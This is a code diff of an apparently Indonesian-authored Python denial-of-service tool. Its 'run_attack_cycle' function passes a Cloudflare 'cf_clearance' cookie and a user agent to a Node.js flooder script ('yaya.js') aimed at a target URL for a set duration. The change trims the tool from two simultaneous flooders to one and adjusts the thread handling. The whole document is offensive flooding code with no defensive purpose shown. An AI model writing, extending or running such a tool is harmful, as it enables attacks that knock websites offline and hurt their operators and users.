@@ -159,8 +159,8 @@ async def run_attack_cycle(url: str, duration: int, cycle_num: int):
 
     parcok = f"cf_clearance={cookie}"
 
-    # ========== JALANKAN 2 FLOODER SEKALIGUS ==========
-    args1 = [
+    # ========== JALANKAN 1 FLOODER (yaya.js) ==========
+    args = [
         "node", "yaya.js", 
         url, 
         str(duration), 
@@ -168,29 +168,25 @@ async def run_attack_cycle(url: str, duration: int, cycle_num: int):
         ua
     ]
     
-    proc1 = subprocess.Popen(
-        args1,
+    proc = subprocess.Popen(
+        args,
         stdout=subprocess.PIPE,
         stderr=subprocess.STDOUT,
         text=True,
         bufsize=1
     )
     
-    print(f"{Fore.GREEN}[+] Flooder 1 (yaya.js) started{Style.RESET_ALL}")
-    print(f"{Fore.GREEN}[+] Flooder 2 (ya.js) started{Style.RESET_ALL}")
-    print(f"{Fore.YELLOW}[+] Both flooders running simultaneously!{Style.RESET_ALL}\n")
+    print(f"{Fore.GREEN}[+] Flooder (yaya.js) started{Style.RESET_ALL}")
+    print(f"{Fore.YELLOW}[+] Running for {duration} seconds...{Style.RESET_ALL}\n")
 
     def read_output(proc, name):
         for line in proc.stdout:
             print(f"[{name}] {line}", end='')
         proc.wait()
 
-    thread1 = threading.Thread(target=read_output, args=(proc1, "yaya"))
-    thread2 = threading.Thread(target=read_output, args=(proc2, "ya"))
-    
-    thread1.start()
-    
-    thread1.join()
+    thread = threading.Thread(target=read_output, args=(proc, "yaya"))
+    thread.start()
+    thread.join()
     
     print(f"{Fore.GREEN}[✓] Cycle #{cycle_num} completed{Style.RESET_ALL}")
     return True
